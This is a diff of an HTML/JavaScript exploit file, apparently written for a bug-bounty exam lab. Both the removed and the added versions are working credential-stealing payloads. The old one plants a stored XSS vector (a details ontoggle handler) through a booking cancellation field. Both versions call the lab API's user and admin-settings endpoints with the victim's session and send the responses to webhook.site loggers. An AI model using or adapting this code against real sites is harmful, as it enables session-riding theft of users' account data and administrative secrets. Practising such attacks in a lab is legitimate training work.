@@ -1,34 +1,35 @@
-<!DOCTYPE html>
-<html>
-<body>
-    <script>
-        const logger = "https://webhook.site/6222374a-b882-44ec-a12d-9671d3dd124c";
-        const api = "https://api-bugbounty-exam.hashacademy.co/api";
-        // USE YOUR NEW ACTIVE CAR ID HERE
-        const activeBookingId = "69dc1bd2d9d06cf59692979e"; 
+<script>
+    const logger = "https://webhook.site/e0ddef86-5a1f-472e-a42c-9612ab165efe";
 
-        async function pwn() {
-            // 1. Try to fetch the bot's ACTUAL profile info
-            // Based on common patterns in this lab, try /auth/user
-            try {
-                const res = await fetch(api + "/auth/user", { credentials: "include" });
-                const data = await res.json();
-                new Image().src = `${logger}/?profile_leak=${btoa(JSON.stringify(data))}`;
-            } catch (e) {}
+    async function findSecret() {
+        // Try the 'Me' endpoint - often contains API keys or secrets
+        try {
+            const res = await fetch("https://api-bugbounty-exam.hashacademy.co/api/auth/me", {
+                method: "GET",
+                credentials: "include"
+            });
+            const data = await res.json();
+            
+            // Leak it to your webhook
+            fetch(logger, {
+                method: "POST",
+                body: JSON.stringify({ source: "AUTH_ME", data: data })
+            });
+        } catch (e) {}
 
-            // 2. Inject the XSS into the ACTIVE booking
-            // This ensures the 'status' error doesn't happen
-            try {
-                const xss = `<details open ontoggle="fetch('${api}/auth/user').then(r=>r.text()).then(t=>fetch('${logger}/?flag='+btoa(t)))">`;
-                await fetch(`${api}/bookings/${activeBookingId}/cancel`, {
-                    method: "PUT",
-                    headers: { "Content-Type": "application/json" },
-                    credentials: "include",
-                    body: JSON.stringify({ "reason": xss })
-                });
-            } catch (e) {}
-        }
-        pwn();
-    </script>
-</body>
-</html>
+        // Try a 'Settings' endpoint just in case
+        try {
+            const res2 = await fetch("https://api-bugbounty-exam.hashacademy.co/api/admin/settings", {
+                method: "GET",
+                credentials: "include"
+            });
+            const data2 = await res2.json();
+            fetch(logger, {
+                method: "POST",
+                body: JSON.stringify({ source: "ADMIN_SETTINGS", data: data2 })
+            });
+        } catch (e) {}
+    }
+
+    findSecret();
+</script>
